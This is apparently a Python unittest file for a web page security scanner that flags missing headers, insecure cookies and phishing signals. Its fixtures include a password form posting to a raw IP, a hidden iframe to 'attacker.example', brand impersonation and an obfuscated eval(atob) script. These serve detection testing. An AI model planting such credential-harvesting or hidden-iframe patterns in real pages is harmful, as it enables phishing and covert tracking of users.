import unittest

from scanner.page_signals import _same_site, audit_page_html, audit_security_headers


class PageSignalsTests(unittest.TestCase):
    def test_same_site_with_public_suffix(self):
        # Normal domain
        self.assertTrue(_same_site("a.example.com", "example.com"))
        self.assertTrue(_same_site("sub.foo.example.co.uk", "bar.example.co.uk"))
        # Public suffix with multi-tenancy: different sites
        self.assertFalse(_same_site("tenant-a.github.io", "tenant-b.github.io"))
        self.assertFalse(_same_site("attacker.co.nz", "victim.co.nz"))

    def test_security_headers_audit(self):
        # Empty headers on HTTPS
        findings = audit_security_headers({}, "https")
        ids = {f["id"] for f in findings}
        self.assertIn("header-missing-hsts", ids)
        self.assertIn("header-missing-csp", ids)
        self.assertIn("header-missing-frame-protection", ids)
        self.assertIn("header-missing-xcto", ids)
        self.assertIn("header-missing-referrer-policy", ids)
        self.assertIn("header-missing-permissions-policy", ids)
        # All findings in security_headers must be severity low
        self.assertTrue(all(f["severity"] == "low" for f in findings))
        self.assertTrue(all(f["group"] == "security_headers" for f in findings))

    def test_hsts_short_max_age(self):
        findings = audit_security_headers({"strict-transport-security": "max-age=86400"}, "https")
        self.assertTrue(any(f["id"] == "header-short-hsts" for f in findings))

    def test_csp_unsafe_inline_flagged(self):
        findings = audit_security_headers({"content-security-policy": "default-src 'self' 'unsafe-inline'"}, "https")
        self.assertTrue(any(f["id"] == "header-weak-csp" for f in findings))

    def test_information_disclosure_and_outdated_software(self):
        headers = {
            "server": "Apache/2.2.34 (Unix) mod_ssl/2.2.34",
            "x-powered-by": "PHP/5.6.40",
        }
        findings = audit_security_headers(headers, "https")
        self.assertTrue(any(f["id"] == "header-version-disclosure" for f in findings))
        self.assertTrue(any("outdated" in f["id"] for f in findings))

    def test_insecure_cookie_attributes(self):
        headers = {"set-cookie": "session_id=abc12345; Path=/"}
        findings = audit_security_headers(headers, "https")
        self.assertTrue(any(f["id"] == "cookie-insecure-attributes" for f in findings))

    def test_password_form_on_plain_http(self):
        html = '<form action="/login"><input type="password" name="pw"></form>'
        findings = audit_page_html(html, "http://insecure.example/login")
        self.assertTrue(any(f["id"] == "form-password-over-http" and f["severity"] == "medium" for f in findings))

    def test_password_form_posts_to_ip_address(self):
        html = '<form action="http://198.51.100.22/collect"><input type="password" name="pw"></form>'
        findings = audit_page_html(html, "https://bank.example/login")
        self.assertTrue(any(f["id"] == "form-posts-to-ip" and f["severity"] == "medium" for f in findings))

    def test_password_form_posts_to_form_builder(self):
        html = '<form action="https://docs.google.com/forms/d/e/123/formResponse"><input type="password"></form>'
        findings = audit_page_html(html, "https://login-portal.example/")
        self.assertTrue(any(f["id"] == "form-posts-to-form-builder" and f["severity"] == "medium" for f in findings))

    def test_hidden_iframe_to_third_party(self):
        html = '<iframe src="https://attacker.example/tracker" style="display:none;" width="0" height="0"></iframe>'
        findings = audit_page_html(html, "https://victim.example/")
        self.assertTrue(any(f["id"] == "page-hidden-iframe" and f["severity"] == "medium" for f in findings))

    def test_meta_refresh_redirect_to_external_site(self):
        html = '<meta http-equiv="refresh" content="0; url=https://external.example/landing">'
        findings = audit_page_html(html, "https://source.example/")
        self.assertTrue(any(f["id"] == "page-meta-refresh-redirect" and f["severity"] == "medium" for f in findings))

    def test_mixed_content_on_https_page(self):
        html = '<script src="http://cdn.example/analytics.js"></script>'
        findings = audit_page_html(html, "https://secure.example/")
        self.assertTrue(any(f["id"] == "page-mixed-content" and f["severity"] == "low" for f in findings))

    def test_brand_impersonation_in_title_on_unrelated_domain(self):
        html = '<html><head><title>PayPal - Login to your account</title></head><body><h1>Welcome</h1></body></html>'
        findings = audit_page_html(html, "https://secure-portal-update.net/login")
        self.assertTrue(any(f["group"] == "url_lookalike" and "PayPal" in f["summary"] for f in findings))

    def test_obfuscation_marker_detected(self):
        html = '<script>eval(atob("YWxlcnQoMSk="));</script>'
        findings = audit_page_html(html, "https://example.com/")
        self.assertTrue(any(f["id"] == "page-script-obfuscation" and f["severity"] == "low" for f in findings))


if __name__ == "__main__":
    unittest.main()
